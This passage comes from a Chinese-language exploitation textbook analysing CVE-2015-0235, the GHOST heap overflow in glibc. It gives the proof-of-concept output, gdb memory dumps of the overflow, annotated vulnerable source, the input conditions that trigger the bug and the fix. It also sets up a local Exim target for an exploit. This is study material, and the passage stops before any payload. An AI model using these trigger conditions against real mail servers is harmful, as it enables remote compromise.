, x86-64, version 1 (SYSV), dynamically linked (uses shared libs
), BuildID[sha1]=0x7c4f51534761d69afd01ac03d3c9bc7ccd21f6c6, for
GNU/Linux 2.6.24, stripped
$ gcc -g poc.c
$ ./a.out
vulnerable
很明显是存在漏洞的。简单解释一下 PoC，在栈上布置一个区域 temp，由 buffer
和 canary 组成，然后初始化一个 name，最后执行函数 gethostbyname_r()，正常
情况下，当把 name+*host_addr+*h_addr_ptrs+1 复制到 buffer 时，会正好覆盖缓
冲区且没有溢出。然而，实际情况并不是这样。
函数 gethostbyname_r() 在 include/netdb.h 中定义如下：
struct hostent {
char *h_name; /* official name of host */
char **h_aliases; /* alias list */
int h_addrtype; /* host address type */
int h_length; /* length of address */
char **h_addr_list; /* list of addresses */
}
#define h_addr h_addr_list[0] /* for backward compatibility */
int gethostbyname_r(const char *name,
struct hostent *ret, char *buf, size_t buflen,
struct hostent **result, int *h_errnop);
name ：网页的 host 名称
ret ：成功时用于存储结果
buf ：临时缓冲区，存储过程中的各种信息
buflen ：缓冲区大小
result ：成功时指向 ret
h_errnop ：存储错误码
执行前：
1520
7.1.2 CVE-2015-0235 glibc __nss_hostname_digits_dots 堆溢出漏洞
gdb-peda$ x/6gx temp.buffer
0x601060 : 0x0000726566667562 0x0000000000000000 : 0x0000000000000000 0x0000000000000000
: 0x0000000000000000 0x0000000000000000
: 0x0000000000000000 0x000000000000000
0
0x601460 : 0x635f6568745f6e69 0x656e696d5f6c616
f : 0x0000000000000000 0x000000000000000
0
执行后：
gdb-peda$ x/6gx temp.buffer
0x601060 : 0x0000000000000000 0x0000000000000000 : 0x0000000000601060 0x0000000000000000
: 0x0000000000000000 0x3030303030303030
: 0x3030303030303030 0x303030303030303
0
0x601460 : 0x0030303030303030 0x656e696d5f6c616
f : 0x0000000000000000 0x000000000000000
0
canary 被覆盖了 8 个字节，即溢出了 8 个字节。
漏洞分析
1521
7.1.2 CVE-2015-0235 glibc __nss_hostname_digits_dots 堆溢出漏洞
grep -irF '__nss_hostname_digits_dots' ./*
./CANCEL-FCT-WAIVE:__nss_hostname_digits_dots
./ChangeLog.12: * nss/Versions (libc): Add __nss_hostname_digits
_dots to GLIBC_2.2.2.
[...]
./nss/getXXbyYY.c: if (__nss_hostname_digits_dots (name, &r
esbuf, &buffer,
./nss/digits_dots.c:__nss_hostname_digits_dots (const char *name
, struct hostent *resbuf,
./nss/digits_dots.c:libc_hidden_def (__nss_hostname_digits_dots)
./nss/getXXbyYY_r.c: switch (__nss_hostname_digits_dots (name,
resbuf, &buffer, NULL,
通过搜索漏洞函数我们发现，函数是从 glibc-2.2.2 开始引入的，且仅在
getXXbyYY.c 和 getXXbyYY_r.c 中被使用，且需要 HANDLE_DIGITS_DOTS 被定
义：
// inet/gethstbynm.c
#define NEED_H_ERRNO 1
// nss/getXXbyYY_r.c
#ifdef HANDLE_DIGITS_DOTS
if (buffer != NULL)
{
if (__nss_hostname_digits_dots (name, &resbuf, &buffer,
&buffer_size, 0, &result, NULL, AF_VAL,
H_ERRNO_VAR_P))
goto done;
}
#endif
具体程序如下（来自glibc-2.17）：
// nss/digits_dots.c
int
__nss_hostname_digits_dots (const char *name, struct hostent *re
sbuf,
char **buffer, size_t *buffer_size,
1522
7.1.2 CVE-2015-0235 glibc __nss_hostname_digits_dots 堆溢出漏洞
size_t buflen, struct hostent **result,
enum nss_status *status, int af, int *h_errnop)
{
[...]
if (isdigit (name[0]) || isxdigit (name[0]) || name[0] == ':'
)
{
const char *cp;
char *hostname;
typedef unsigned char host_addr_t[16];
host_addr_t *host_addr;
typedef char *host_addr_list_t[2];
host_addr_list_t *h_addr_ptrs;
char **h_alias_ptr;
size_t size_needed;
[...]
// size_needed 决定了缓冲区的大小，即 *host_addr+*h_addr_ptr
s+name+1 （1存储结尾的'\0'）
size_needed = (sizeof (*host_addr)
+ sizeof (*h_addr_ptrs) + strlen (name) + 1);
if (buffer_size == NULL) // 重入分支
{
if (buflen  0
;
}
if (! ok)
{
1524
7.1.2 CVE-2015-0235 glibc __nss_hostname_digits_dots 堆溢出漏洞
[...]
goto done;
}
resbuf->h_name = strcpy (hostname, name);
// 复制 name 到 hostname，触发缓冲区溢出
[...]
goto done;
}
if (!isdigit (*cp) && *cp != '.')
break;
}
}
注释已经在代码中了，也就是实际需要的缓冲区长度与所申请的缓冲区长度不一致
的问题。当然想要触发漏洞，需要满足下面几个条件：
name 的第一个字符必须是数字
name 的最后一个字符不能是 "."
name 的所有字符只能是数字或者 "."
必须是 IPv4 地址且必须是这些格式中的一种："a.b.c.d"，"a.b.c"，"a"，且
a,b,c,d 均不能超过无符号整数的最大值，即 0xffffffff
对比一下 glibc-2.18 的代码，也就是把 h_alias_ptr 的长度加上了，问题完美解决：
size_needed = (sizeof (*host_addr)
+ sizeof (*h_addr_ptrs)
+ sizeof (*h_alias_ptr) + strlen (name) + 1);
Exim exploit
1525
7.1.2 CVE-2015-0235 glibc __nss_hostname_digits_dots 堆溢出漏洞
$ sudo apt-get install libpcre3-dev
$ git clone https://github.com/Exim/exim.git
$ cd exim/src
$ git checkout exim-4_80
$ mkdir Local
$ cp src/EDITME Local/Makefile
$ #修改 Makefile 中的 EXIM_USER=你的用户名
$ #注释掉 EXIM_MONITOR=eximon.bin
$ #然后取消掉 PCRE_LIBS=-lpcre 的注释
$ make && sudo make install
最后为了能够调用 smtp_verify_helo() ，在 Exim 的配置文件中必须开启
helo_verify_hosts 或 helo_try_verify_hosts 。在文件
/var/lib/exim4/config.autogenerated 中的 acl_smtp_mail 一行下面加
上 helo_try_verify_hosts = * 或者 helo_verify_hosts = * ：
acl_smtp_mail = MAIN_ACL_CHECK_MAIL
helo_try_verify_hosts = *
更新并重启软件即可：
$ update-exim4.conf
$ exim4 -bP | grep helo_try
helo_try_verify_hosts = *
$ sudo /etc/init.d/exim4 stop
$ sudo /usr/exim/bin/exim -bdf -d+all
这样就把程序以 debug 模式开启了，之后的所有操作都会被打印出来，方便观察。
还是为了方便（懒），后续的所有操作都只在本地执行。
先简单地看一下 Exim 处理 HELO 命令的过程，在另一个 shell 里，使用 telenet 连
接上 Exim，根据前面的限制条件随便输入点什么：
1526
7.1.2 CVE-2015-0235 glibc __nss_hostname_digits_dots 堆溢出漏洞
$ telnet 127.0.0.1 25
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
220 firmy-VirtualBox ESMTP Exim 4.76 Fri, 26 Jan 2018 16:58:37 +
0800
HELO 0123456789
250 firmy-VirtualBox Hello localhost [127.0.0.1]
^CConnection closed by foreign host.
firmy@firmy-VirtualBox:~$ telnet 127.0.0.1 25
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
220 firmy-VirtualBox ESMTP Exim 4.76 Fri, 26 Jan 2018 17:00:47 +
0800
HELO 0123456789
250 firmy-VirtualBox Hello localhost [127.0.0.1]
结果如下：
1527
7.1.2 CVE-2015-0235 glibc __nss_hostname_digits_dots 堆溢出漏洞
17:00:47 5577 Process 5577 is ready for new message
17:00:47 5577 smtp_setup_msg entered
17:00:55 5577 SMTP> 250 firmy-VirtualBox Hello localhost [127.
0.0.1]
可以看到它最终调用了 gethostbyname2() 函数来解析来自 SMTP 客户端的数
据包。具体代码如下：github
// src/src/smtp_in.c
int
smtp_setup_msg(void)
{
[...]
while (done <= 0)
{
[...]
switch(smtp_read_command(TRUE))
{
[...]
1528
7.1.2 CVE-2015-0235 glibc __nss_hostname_digits_dots 堆溢出漏洞
case HELO_CMD:
HAD(SCH_HELO);
hello = US"HELO";